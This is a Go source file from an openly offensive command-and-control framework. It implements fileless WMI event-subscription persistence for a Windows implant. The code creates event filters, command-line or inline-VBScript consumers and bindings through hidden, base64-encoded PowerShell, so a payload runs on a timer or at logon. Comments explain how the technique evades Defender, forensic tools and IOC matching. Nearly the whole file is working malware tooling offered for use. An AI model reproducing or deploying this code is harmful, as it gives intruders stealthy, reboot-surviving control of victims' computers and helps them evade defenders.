package persistence

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// WMI Subscription Persistence — fileless, registry-light, hardest to detect.
//
// WMI (Windows Management Instrumentation) provides a built-in eventing
// engine that survives reboots. A subscription consists of three objects
// stored inside the WMI repository (%SystemRoot%\System32\wbem\Repository):
//
//   __EventFilter        — defines the trigger condition (CQL query)
//   __EventConsumer      — defines what to do when the filter fires
//   __FilterToConsumerBinding — links a filter to a consumer
//
// Consumer types we support:
//   CommandLineEventConsumer  — runs an arbitrary command/executable
//   ActiveScriptEventConsumer — runs a VBScript/JScript payload inline
//
// Trigger types:
//   __TimerEvent    — fires on a fixed interval (e.g. every 60 minutes)
//   __InstanceModificationEvent — fires when a WMI instance changes
//   Win32_LogonSession (creation) — fires on any user logon
//
// Detection difficulty:
//   - No disk files created (payload can be inline VBScript)
//   - No Run/RunOnce registry keys
//   - No scheduled tasks
//   - Repository is binary — hard to parse with standard forensic tools
//   - Defender does NOT remove WMI subscriptions by default
//   - Blue-team detection requires: Get-WMIObject __EventFilter (PowerShell)
//     or commercial tools like Autoruns / Carbon Black
//
// Cleanup:
//   Remove() deletes all three WMI objects by name. If the implant exits
//   without cleanup the subscription survives indefinitely.
//
// Implementation uses the OLE/COM WMI scripting API through PowerShell
// stdin piping — this avoids importing any WMI COM type libraries and
// keeps the implant dependency-free while still being fully functional.
// All WMI operations go through `powershell.exe -NonInteractive -Command`
// invocations with the scripts encoded as base64 to handle quoting.

import (
	"encoding/base64"
	"fmt"
	"os/exec"
	"strings"
	"unicode/utf16"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
)

// WMISubscription describes a WMI persistence entry.
type WMISubscription struct {
	// FilterName is the __EventFilter name. Randomise to avoid IOC matching.
	FilterName string
	// ConsumerName is the __EventConsumer name.
	ConsumerName string
	// Trigger controls when the subscription fires.
	Trigger WMITrigger
	// Payload is what executes. Use CommandPayload or ScriptPayload.
	Payload WMIPayload
	// Namespace to create the subscription in.
	// root\subscription for permanent (survives reboot, requires admin).
	// root\default    for session-only (no admin, but lost on logout).
	Namespace string
}

// WMITrigger selects the event source.
type WMITrigger int

const (
	TriggerTimer  WMITrigger = iota // fires every IntervalSeconds seconds
	TriggerLogon                    // fires on any user logon
	TriggerStartup                  // fires at Windows startup (via timer with delay)
)

// WMIPayload describes what the consumer does when the filter fires.
type WMIPayload struct {
	// Command is the path to an executable to run (CommandLineEventConsumer).
	Command string
	// CommandArgs are the arguments for Command.
	CommandArgs string
	// Script is an inline VBScript payload (ActiveScriptEventConsumer).
	// If non-empty, overrides Command.
	Script string
	// IntervalSeconds sets the timer interval (for TriggerTimer).
	IntervalSeconds int
}

// DefaultSubscription returns a ready-to-use subscription that runs
// executablePath every 60 minutes from the permanent namespace.
func DefaultSubscription(name, executablePath string) WMISubscription {
	return WMISubscription{
		FilterName:   name + "F",
		ConsumerName: name + "C",
		Trigger:      TriggerTimer,
		Payload: WMIPayload{
			Command:         executablePath,
			IntervalSeconds: 3600,
		},
		Namespace: `root\subscription`,
	}
}

// Install creates the WMI subscription on the local machine.
// Requires Administrator or SYSTEM (for root\subscription).
func Install(sub WMISubscription) error {
	if sub.Namespace == "" {
		sub.Namespace = `root\subscription`
	}
	if sub.Payload.IntervalSeconds == 0 {
		sub.Payload.IntervalSeconds = 3600
	}

	script := buildInstallScript(sub)
	if err := runPowerShellScript(script); err != nil {
		return fmt.Errorf("WMI install: %w", err)
	}
	// {{if .Config.Debug}}
	log.Printf("[wmi] subscription installed: filter=%s consumer=%s",
		sub.FilterName, sub.ConsumerName)
	// {{end}}
	return nil
}

// Remove deletes the WMI subscription objects by name.
func Remove(namespace, filterName, consumerName string) error {
	if namespace == "" {
		namespace = `root\subscription`
	}
	script := buildRemoveScript(namespace, filterName, consumerName)
	if err := runPowerShellScript(script); err != nil {
		return fmt.Errorf("WMI remove: %w", err)
	}
	// {{if .Config.Debug}}
	log.Printf("[wmi] subscription removed: filter=%s consumer=%s",
		filterName, consumerName)
	// {{end}}
	return nil
}

// List returns a PowerShell one-liner that enumerates existing subscriptions.
// Useful for the operator to inspect the target before installing.
func List(namespace string) (string, error) {
	if namespace == "" {
		namespace = `root\subscription`
	}
	script := fmt.Sprintf(`
$ns = '%s'
Get-WmiObject -Namespace $ns -Class __EventFilter | Select Name, Query | Format-Table -AutoSize
Get-WmiObject -Namespace $ns -Class __EventConsumer | Select Name, CommandLineTemplate, ScriptText | Format-Table -AutoSize
Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Select Filter, Consumer | Format-Table -AutoSize
`, namespace)
	return runPowerShellScriptOutput(script)
}

// ─────────────────────────────────────────────────────────────────────────────
// Script builders
// ─────────────────────────────────────────────────────────────────────────────

func buildInstallScript(sub WMISubscription) string {
	var sb strings.Builder
	ns := sub.Namespace

	// EventFilter
	var query string
	switch sub.Trigger {
	case TriggerLogon:
		query = `SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'`
	case TriggerStartup:
		query = fmt.Sprintf(`SELECT * FROM __TimerEvent WHERE TimerID='%s'`, sub.FilterName)
	default: // TriggerTimer
		query = fmt.Sprintf(`SELECT * FROM __TimerEvent WHERE TimerID='%s'`, sub.FilterName)
	}

	sb.WriteString(fmt.Sprintf(`
$ns = '%s'
$wmi = [wmiclass]"\\.\%s:__EventFilter"
$filter = $wmi.CreateInstance()
$filter.Name = '%s'
$filter.QueryLanguage = 'WQL'
$filter.Query = '%s'
$filter.EventNamespace = '%s'
$filter.Put()
`, ns, ns, sub.FilterName, escapeWMI(query), ns))

	// For timer triggers, also create the __IntervalTimerInstruction.
	if sub.Trigger == TriggerTimer || sub.Trigger == TriggerStartup {
		sb.WriteString(fmt.Sprintf(`
$timer = [wmiclass]"\\.\root\cimv2:__IntervalTimerInstruction"
$t = $timer.CreateInstance()
$t.TimerID = '%s'
$t.IntervalBetweenEvents = %d
$t.Put()
`, sub.FilterName, sub.Payload.IntervalSeconds*1000))
	}

	// EventConsumer
	if sub.Payload.Script != "" {
		// ActiveScriptEventConsumer — inline VBScript
		sb.WriteString(fmt.Sprintf(`
$consClass = [wmiclass]"\\.\%s:ActiveScriptEventConsumer"
$consumer = $consClass.CreateInstance()
$consumer.Name = '%s'
$consumer.ScriptingEngine = 'VBScript'
$consumer.ScriptText = '%s'
$consumer.Put()
`, ns, sub.ConsumerName, escapeWMI(sub.Payload.Script)))
	} else {
		// CommandLineEventConsumer
		cmdLine := sub.Payload.Command
		if sub.Payload.CommandArgs != "" {
			cmdLine += " " + sub.Payload.CommandArgs
		}
		sb.WriteString(fmt.Sprintf(`
$consClass = [wmiclass]"\\.\%s:CommandLineEventConsumer"
$consumer = $consClass.CreateInstance()
$consumer.Name = '%s'
$consumer.CommandLineTemplate = '%s'
$consumer.Put()
`, ns, sub.ConsumerName, escapeWMI(cmdLine)))
	}

	// FilterToConsumerBinding
	sb.WriteString(fmt.Sprintf(`
$bindClass = [wmiclass]"\\.\%s:__FilterToConsumerBinding"
$binding = $bindClass.CreateInstance()
$binding.Filter = $filter.Path_
$binding.Consumer = $consumer.Path_
$binding.Put()
Write-Output "WMI_INSTALL_OK"
`, ns))

	return sb.String()
}

func buildRemoveScript(namespace, filterName, consumerName string) string {
	return fmt.Sprintf(`
$ns = '%s'
Get-WmiObject -Namespace $ns -Class __EventFilter -Filter "Name='%s'" | Remove-WmiObject
Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -Filter "Name='%s'" | Remove-WmiObject
Get-WmiObject -Namespace $ns -Class ActiveScriptEventConsumer -Filter "Name='%s'" | Remove-WmiObject
Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match '%s' -or $_.Consumer -match '%s' } | Remove-WmiObject
Write-Output "WMI_REMOVE_OK"
`, namespace,
		filterName,
		consumerName,
		consumerName,
		filterName, consumerName)
}

func escapeWMI(s string) string {
	return strings.ReplaceAll(s, "'", "''")
}

// ─────────────────────────────────────────────────────────────────────────────
// PowerShell runner
// ─────────────────────────────────────────────────────────────────────────────

// runPowerShellScript encodes script as UTF-16LE base64 and runs it via
// powershell -EncodedCommand. This avoids all quoting issues.
func runPowerShellScript(script string) error {
	encoded := encodePSCommand(script)
	cmd := exec.Command("powershell.exe",
		"-NonInteractive", "-WindowStyle", "Hidden",
		"-EncodedCommand", encoded)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("powershell exit: %w — %s", err, string(out))
	}
	// {{if .Config.Debug}}
	log.Printf("[wmi] powershell output: %s", string(out))
	// {{end}}
	return nil
}

func runPowerShellScriptOutput(script string) (string, error) {
	encoded := encodePSCommand(script)
	cmd := exec.Command("powershell.exe",
		"-NonInteractive", "-WindowStyle", "Hidden",
		"-EncodedCommand", encoded)
	out, err := cmd.Output()
	return string(out), err
}

// encodePSCommand encodes a PowerShell script as UTF-16LE base64 for use
// with the -EncodedCommand parameter.
func encodePSCommand(script string) string {
	runes := []rune(script)
	u16 := utf16.Encode(runes)
	buf := make([]byte, len(u16)*2)
	for i, r := range u16 {
		buf[i*2] = byte(r)
		buf[i*2+1] = byte(r >> 8)
	}
	return base64.StdEncoding.EncodeToString(buf)
}
